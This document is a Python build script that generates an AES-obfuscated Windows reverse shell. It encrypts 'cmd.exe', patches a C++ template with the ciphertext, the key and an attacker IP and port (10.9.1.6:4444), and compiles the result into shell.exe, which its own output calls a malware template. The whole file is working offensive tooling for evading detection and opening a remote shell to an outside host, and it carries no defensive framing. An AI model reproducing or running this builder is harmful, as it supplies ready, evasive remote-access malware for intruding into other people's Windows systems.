# shell-aes.py
# author: @cocomelonc
# windows reverse shell AES encryptor (only cmd.exe now)
import sys
import os
from Crypto.Cipher import AES
from os import urandom
import hashlib

def pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def convert(data):
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += hex(ordd(current))
    return output_str.split("0x")

# AES encryption
# key is randomized (16 bytes random string),
# and the key is then transform into the SHA256 hash and
# then it is used as a key for encrypting plaintext
def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * '\x00'
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
    ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
    ciphertext, key = convert(ciphertext), convert(key)
    ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
    key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
    return ciphertext, key

my_secret_key = urandom(16)
ip, port = "10.9.1.6", "4444"

## process cmd.exe
plaintext = "cmd.exe"
ciphertext, key = AESencrypt(plaintext, my_secret_key)

## open and replace our payload in C++ code
tmp = open("shell-aes.cpp", "rt")
data = tmp.read()
data = data.replace('unsigned char myCmd[] = { };', 'unsigned char myCmd[] = ' + ciphertext)
data = data.replace('unsigned char mySecretKey[] = { };', 'unsigned char mySecretKey[] = ' + key)
data = data.replace('char *ip = "127.0.0.1";', 'char *ip = "' + ip + '";')
data = data.replace('short port = 4444;', 'short port = ' + port + ';')
tmp.close()
tmp = open("shell3.cpp", "w+")
tmp.write(data)
tmp.close()

## compile
try:
    cmd = "i686-w64-mingw32-g++ shell3.cpp -o shell.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
    os.system(cmd)
    os.remove("./shell3.cpp")
except Exception as e:
    print ("error compiling malware template :(")
    print (str(e))
    sys.exit()
else:
    print (cmd)
    print ("successfully compiled :)")
